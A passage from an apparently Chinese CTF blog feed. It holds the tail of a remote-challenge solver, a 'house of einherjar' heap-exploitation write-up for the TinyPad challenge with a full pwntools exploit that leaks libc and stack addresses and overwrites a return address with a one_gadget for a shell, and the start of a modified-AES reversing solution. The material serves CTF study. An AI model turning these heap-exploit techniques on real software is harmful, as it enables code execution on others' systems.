class="hljs-string">&quot;chmod 777 file_2&quot;</span>)<br>    p = process(<span class="hljs-string">&quot;./file_2&quot;</span>)<br>    data = p.recvall()<br>    r1, r2 = fuck(data)<br>    print(<span class="hljs-string">&quot;r1=&quot;</span>, <span class="hljs-built_in">hex</span>(r1))<br>    print(<span class="hljs-string">&quot;r2=&quot;</span>, <span class="hljs-built_in">hex</span>(r2))<br>    res = fuckyouZ3(r1, r2)<br>    <span class="hljs-keyword">return</span> binascii.a2b_hex(res)<br><br>sh = remote(<span class="hljs-string">&#x27;111.186.58.164&#x27;</span>,<span class="hljs-number">30212</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;XXXX+&#x27;</span>)<br>tail = sh.recvuntil(<span class="hljs-string">&#x27;)&#x27;</span>)[:-<span class="hljs-number">1</span>].decode()<br>print(tail)<br>sh.recvuntil(<span class="hljs-string">&#x27;== &#x27;</span>)<br>value = <span class="hljs-built_in">int</span>(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>print(value)<br>xrange=string.digits+string.ascii_letters<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> xrange:<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> xrange:<br>            <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> xrange:<br>                m=(<span class="hljs-built_in">str</span>(i)+<span class="hljs-built_in">str</span>(j)+<span class="hljs-built_in">str</span>(x)+<span class="hljs-built_in">str</span>(l)+tail).encode()<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sha256(m).hexdigest(),<span class="hljs-number">16</span>) == value:<br>                    payload1 = (<span class="hljs-built_in">str</span>(i)+<span class="hljs-built_in">str</span>(j)+<span class="hljs-built_in">str</span>(x)+<span class="hljs-built_in">str</span>(l))<br>                    print(payload1)<br><br>sh.recv()<br>sh.send(payload1)<br>sh.recvuntil(<span class="hljs-string">&#x27;Here is your challenge:\n&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>file = sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>file = base64.b64decode(file)<br>sh.send(solve(file))<br><br>sh.recvuntil(<span class="hljs-string">&#x27;Here is your challenge:\n&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>file = sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>file = base64.b64decode(file)<br>sh.send(solve(file))<br><br>sh.recvuntil(<span class="hljs-string">&#x27;Here is your challenge:\n&#x27;</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>file = sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>file = base64.b64decode(file)<br>sh.send(solve(file))<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>Unicorn</tag>
      
      <tag>AutoRE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of einherjar</title>
    <link href="/2021/06/27/house-of-einherjar/"/>
    <url>/2021/06/27/house-of-einherjar/</url>
    
    <content type="html"><![CDATA[<h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h1><p>这个利用手段可以将 top chunk 移动到任意内存，然后通过分配的内存取得对任意内存读写的权限。</p><p>利用条件：</p><ul><li>可以修改 top chunk 相邻 chunk 的 size 域低字节（通常是 off by one ）</li><li>需要泄漏堆地址、目标 fake_chunk 地址用于计算 prev_size</li></ul><p>利用方法： 修改物理相邻 top chunk 的 chunk 中 size 的  inuse 标志位，并伪造 prev_size 使其指向 fake_chunk，释放该 chunk，使 fake chunk 与 top chunk 合并。再次分配内存，将从 fake chunk 处开始分配。</p><p>fake chunk 中的 size 与 伪造 prev_size 相同来绕过 size(P) == prev_size(next_chunk(P))，并且 fd、bk、fd_nextsize、bk_nextsize 均指向 fake chunk 来绕过 check。</p><p>原理很简单，做题的时候遇到很多细节处理起来还是不太顺手…</p><h2 id="SECCOND-TinyPad"><a href="#SECCOND-TinyPad" class="headerlink" title="SECCOND TinyPad"></a>SECCOND TinyPad</h2><p>主要特点如下:</p><ul><li>没有开 PIE</li><li>bss 上有堆地址</li><li>输入函数存在 off by one</li><li>分配 note 初始填充无0截断</li><li>修改 note 有0截断</li><li>bss 段可输入数据</li><li>有 UAF，可以泄漏堆地址与libc地址</li></ul><p>这道题貌似可以用 unlink attack，但是 edit 有 0 截断，不是很方便，于是尝试将 top chunk 移动到 bss 段上，利用创建 note 来修改 bss 段的地址表。</p><p>信息泄漏，这道题存在 UAF，先创建 note 删除后进入 unsorted bin，fd 地址是 libc 中的地址，再释放另外一个 chunk，新释放的 chunk 的 fd 指向堆中的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># leak</span><br>Add(<span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x80</span>) <span class="hljs-comment"># 1</span><br>Add(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x80</span>) <span class="hljs-comment"># 2</span><br>Add(<span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x80</span>) <span class="hljs-comment"># 3</span><br>Add(<span class="hljs-number">0xf0</span>, <span class="hljs-string">b&#x27;\xCC&#x27;</span> * (<span class="hljs-number">0x100</span> - <span class="hljs-number">1</span>)) <span class="hljs-comment"># 4</span><br><span class="hljs-comment"># leak libc</span><br>Del(<span class="hljs-number">3</span>)<br><span class="hljs-comment"># leak heap</span><br>Del(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;INDEX: 1\n # CONTENT: &#x27;</span>)<br>leak_raw_heap = u64(p.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>print(<span class="hljs-string">&quot;leak raw heap: &quot;</span>, <span class="hljs-built_in">hex</span>(leak_raw_heap))<br><br>p.recvuntil(<span class="hljs-string">&#x27;INDEX: 3\n # CONTENT: &#x27;</span>)<br>leak_raw_libc = u64(p.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>libc_base = leak_raw_libc - <span class="hljs-number">0x39bb78</span><br>print(<span class="hljs-string">&quot;libc base: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br></code></pre></td></tr></table></figure><p>edit 的内容会先读取到 tinypad(0x604020) 然后再用 strcpy 复制到对应的 note 堆内存，利用 edit 这一点，我们在 tinypad 处构造 fake chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_chunk_addr =  <span class="hljs-number">0x602040</span><br>tsize = leak_raw_heap + <span class="hljs-number">0xa0</span> - fake_chunk_addr<br>print(<span class="hljs-string">&quot;fake size: &quot;</span>, <span class="hljs-built_in">hex</span>(tsize))<br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(tsize + <span class="hljs-number">1</span>)<br>fake_chunk += p64(fake_chunk_addr) <span class="hljs-comment">#fd</span><br>fake_chunk += p64(fake_chunk_addr) <span class="hljs-comment">#bk</span><br>fake_chunk += p64(fake_chunk_addr)<br>fake_chunk += p64(fake_chunk_addr)<br>Add(<span class="hljs-number">0x98</span>, <span class="hljs-string">b&#x27;\x11&#x27;</span> * <span class="hljs-number">0x90</span> + p64(tsize)) <span class="hljs-comment"># 3 </span><br>Add(<span class="hljs-number">0x98</span>, <span class="hljs-string">b&#x27;\x22&#x27;</span> * <span class="hljs-number">0x97</span>)<br>Edit(<span class="hljs-number">3</span>, fake_chunk)<br><br><br>Del(<span class="hljs-number">4</span>)<br>Del(<span class="hljs-number">3</span>)<br><span class="hljs-comment">### 已经成功将 top 转移到 tinypad</span><br></code></pre></td></tr></table></figure><p>最后泄漏__environ的值获得栈地址，计算 main 函数的返回地址保存位置，修改返回地址为 one_gadget 即可 getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">Add(<span class="hljs-number">0xe0</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x20</span>) <span class="hljs-comment"># top -&gt; 602130</span><br><br><br>fake_pad = p64(<span class="hljs-number">0xAABBCCDD11223344</span>)<br>fake_pad += p64(libc_base + libc.symbols[<span class="hljs-string">&#x27;__environ&#x27;</span>])<br><br>Add(<span class="hljs-number">0xe0</span>, fake_pad)<br>p.recvuntil(<span class="hljs-string">&#x27;INDEX: 1\n # CONTENT: &#x27;</span>)<br>leak_stack = u64(p.recvn(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>print(<span class="hljs-string">&quot;leak stack: &quot;</span>, <span class="hljs-built_in">hex</span>(leak_stack))<br>Edit(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;AAAAAAAA&#x27;</span> + p64(leak_stack - <span class="hljs-number">0xe8</span>))<br><br>one_gadget = <span class="hljs-number">0x3f3d6</span> + libc_base<br>Edit(<span class="hljs-number">1</span>, p64(one_gadget))<br>Exit()<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="完整-exp"><a href="#完整-exp" class="headerlink" title="完整 exp"></a>完整 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-comment">#libc_file_name = &#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/libc-2.23.so&#x27;</span><br>libc_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/2.23/64/lib/libc-2.23.so&#x27;</span><br>ld_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/ld-linux-x86-64.so.2&#x27;</span><br>bin_file = <span class="hljs-string">&#x27;./tinypad&#x27;</span><br><br><br>libc = ELF(libc_file_name)<br><br>elf = ELF(bin_file)<br>p = process([ld_file_name, bin_file],<br>           env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>: libc_file_name&#125;)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Add</span>(<span class="hljs-params">size, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(SIZE)&gt;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;(CONTENT)&gt;&gt;&gt; &#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Edit</span>(<span class="hljs-params">index, content</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(INDEX)&gt;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;(CONTENT)&gt;&gt;&gt; &#x27;</span>, content)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(Y/n)&gt;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Del</span>(<span class="hljs-params">index</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(INDEX)&gt;&gt;&gt; &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exit</span>():</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>)<br><br><span class="hljs-comment"># leak libc</span><br>Add(<span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x80</span>) <span class="hljs-comment"># 1</span><br>Add(<span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x80</span>) <span class="hljs-comment"># 2</span><br>Add(<span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;B&#x27;</span> * <span class="hljs-number">0x80</span>) <span class="hljs-comment"># 3</span><br>Add(<span class="hljs-number">0xf0</span>, <span class="hljs-string">b&#x27;\xCC&#x27;</span> * (<span class="hljs-number">0x100</span> - <span class="hljs-number">1</span>)) <span class="hljs-comment"># 4</span><br><br>Del(<span class="hljs-number">3</span>)<br><span class="hljs-comment"># leak heap</span><br>Del(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;INDEX: 1\n # CONTENT: &#x27;</span>)<br>leak_raw_heap = u64(p.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>print(<span class="hljs-string">&quot;leak raw heap: &quot;</span>, <span class="hljs-built_in">hex</span>(leak_raw_heap))<br><br>p.recvuntil(<span class="hljs-string">&#x27;INDEX: 3\n # CONTENT: &#x27;</span>)<br>leak_raw_libc = u64(p.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>libc_base = leak_raw_libc - <span class="hljs-number">0x39bb78</span><br>print(<span class="hljs-string">&quot;libc base: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment"># 0x55555679c1b0 + 0xa1 - fake_chunk_addr ==  tsize</span><br><br>fake_chunk_addr =  <span class="hljs-number">0x602040</span><br>tsize = leak_raw_heap + <span class="hljs-number">0xa0</span> - fake_chunk_addr<br>print(<span class="hljs-string">&quot;fake size: &quot;</span>, <span class="hljs-built_in">hex</span>(tsize))<br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(tsize + <span class="hljs-number">1</span>)<br>fake_chunk += p64(fake_chunk_addr)<br>fake_chunk += p64(fake_chunk_addr)<br>fake_chunk += p64(fake_chunk_addr)<br>fake_chunk += p64(fake_chunk_addr)<br>Add(<span class="hljs-number">0x98</span>, <span class="hljs-string">b&#x27;\x11&#x27;</span> * <span class="hljs-number">0x90</span> + p64(tsize)) <span class="hljs-comment">#3</span><br>Add(<span class="hljs-number">0x98</span>, <span class="hljs-string">b&#x27;\x22&#x27;</span> * <span class="hljs-number">0x97</span>)<br>Edit(<span class="hljs-number">3</span>, fake_chunk)<br><br>gdb.attach(p)<br><span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br><br>Del(<span class="hljs-number">4</span>)<br>Del(<span class="hljs-number">3</span>)<br><span class="hljs-comment">### 已经成功将 top 转移到 tinypad</span><br>Add(<span class="hljs-number">0xe0</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x20</span>) <span class="hljs-comment"># top -&gt; 602130</span><br><br><br>fake_pad = p64(<span class="hljs-number">0xAABBCCDD11223344</span>)<br>fake_pad += p64(libc_base + libc.symbols[<span class="hljs-string">&#x27;__environ&#x27;</span>])<br><br>Add(<span class="hljs-number">0xe0</span>, fake_pad)<br>p.recvuntil(<span class="hljs-string">&#x27;INDEX: 1\n # CONTENT: &#x27;</span>)<br>leak_stack = u64(p.recvn(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>print(<span class="hljs-string">&quot;leak stack: &quot;</span>, <span class="hljs-built_in">hex</span>(leak_stack))<br>Edit(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;AAAAAAAA&#x27;</span> + p64(leak_stack - <span class="hljs-number">0xe8</span>))<br><br>one_gadget = <span class="hljs-number">0x3f3d6</span> + libc_base<br>Edit(<span class="hljs-number">1</span>, p64(one_gadget))<br>Exit()<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>heap</tag>
      
      <tag>one_gadget</tag>
      
      <tag>off_by_one</tag>
      
      <tag>einherjar</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gkctf KillerAid</title>
    <link href="/2021/06/26/gkctf-KillerAid/"/>
    <url>/2021/06/26/gkctf-KillerAid/</url>
    
    <content type="html"><![CDATA[<h1 id="挂科CTF-KillerAid"><a href="#挂科CTF-KillerAid" class="headerlink" title="挂科CTF KillerAid"></a>挂科CTF KillerAid</h1><p>题目下载: <a href="/2021/06/26/gkctf-KillerAid/KillerAid.zip" title="KillerAid.zip">KillerAid.zip</a></p><p>C# 逆向，DLL做核心验证，DLL 里面有反调试，简单 patch 即可</p><p>然后有一个极其恶心的 AES 魔改算法</p><p>行移位</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myshift</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span></span>&#123;<br>    <span class="hljs-keyword">int</span> tmpArr[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    tmpArr[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = pArray[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>    tmpArr[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = pArray[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>    tmpArr[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] = pArray[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>];<br>    tmpArr[<span class="hljs-number">0</span>][<span class="hljs-number">3</span>] = pArray[<span class="hljs-number">3</span>][<span class="hljs-number">3</span>];<br><br>    tmpArr[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] = pArray[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>    tmpArr[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = pArray[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>];<br>    tmpArr[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>] = pArray[<span class="hljs-number">3</span>][<span class="hljs-number">2</span>];<br>    tmpArr[<span class="hljs-number">1</span>][<span class="hljs-number">3</span>] = pArray[<span class="hljs-number">0</span>][<span class="hljs-number">3</span>];<br><br><br>    tmpArr[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = pArray[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>];<br>    tmpArr[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>] = pArray[<span class="hljs-number">3</span>][<span class="hljs-number">1</span>];<br>    tmpArr[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] = pArray[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>];<br>    tmpArr[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>] = pArray[<span class="hljs-number">1</span>][<span class="hljs-number">3</span>];<br><br>    tmpArr[<span class="hljs-number">3</span>][<span class="hljs-number">0</span>] = pArray[<span class="hljs-number">3</span>][<span class="hljs-number">0</span>];<br>    tmpArr[<span class="hljs-number">3</span>][<span class="hljs-number">1</span>] = pArray[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>    tmpArr[<span class="hljs-number">3</span>][<span class="hljs-number">2</span>] = pArray[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>];<br>    tmpArr[<span class="hljs-number">3</span>][<span class="hljs-number">3</span>] = pArray[<span class="hljs-number">2</span>][<span class="hljs-number">3</span>];<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>            pArray[i][j] = tmpArr[i][j];<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>外层的也很恶心</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mydeaes</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *p, <span class="hljs-keyword">char</span> * iv,<span class="hljs-keyword">int</span> plen, <span class="hljs-keyword">char</span> *key)</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span> pArray0[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> pArray1[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> pIv[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> k=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">char</span> key_use[<span class="hljs-number">16</span>];<br><br><br>    convertToIntArray(iv, pIv);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k1 = <span class="hljs-number">31</span>; k1 &gt;= <span class="hljs-number">0</span>; k1 -= <span class="hljs-number">1</span>) &#123;<br><br>        <span class="hljs-built_in">memcpy</span>(key_use, key, <span class="hljs-number">16</span>);<br>        getRoundIvAndKey(k1, iv, key_use, pIv);  <span class="hljs-comment">// f8 82</span><br>        extendKey(key_use);<span class="hljs-comment">//扩展密钥</span><br><br><br>        convertToIntArray(&amp;p[<span class="hljs-number">16</span>], pArray1);<br>        convertToIntArray(&amp;p[<span class="hljs-number">0</span>], pArray0);<br><br>        addRoundKey(pArray1, <span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">9</span>; i &gt;= <span class="hljs-number">1</span>; i--) &#123;<br>            mydeshift(pArray1);<br>            deSubBytes(pArray1);<br>            addRoundKey(pArray1, i);<br><br>            myTranspose(pArray1);<br>            deMixColumns(pArray1);<span class="hljs-comment">//列混合</span><br>            myTranspose(pArray1);<br>        &#125;<br>        mydeshift(pArray1);<span class="hljs-comment">//行移位</span><br>        deSubBytes(pArray1);<span class="hljs-comment">//字节代换</span><br>        addRoundKey(pArray1, <span class="hljs-number">0</span>);<span class="hljs-comment">//一开始的轮密钥加</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; ++j) &#123;<br>                pArray1[i][j] ^= pArray0[i][j];<br>            &#125;<br>        &#125;<br><br><br>        addRoundKey(pArray0, <span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">9</span>; i &gt;= <span class="hljs-number">1</span>; i--) &#123;<br>            mydeshift(pArray0);<br>            deSubBytes(pArray0);<br>            addRoundKey(pArray0, i);<br><br>            myTranspose(pArray0);<br>            deMixColumns(pArray0);<span class="hljs-comment">//列混合</span><br>            myTranspose(pArray0);<br>        &#125;<br>        mydeshift(pArray0);<span class="hljs-comment">//行移位</span><br>        deSubBytes(pArray0);<span class="hljs-comment">//字节代换</span><br>        addRoundKey(pArray0, <span class="hljs-number">0</span>);<span class="hljs-comment">//一开始的轮密钥加</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; ++i) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; 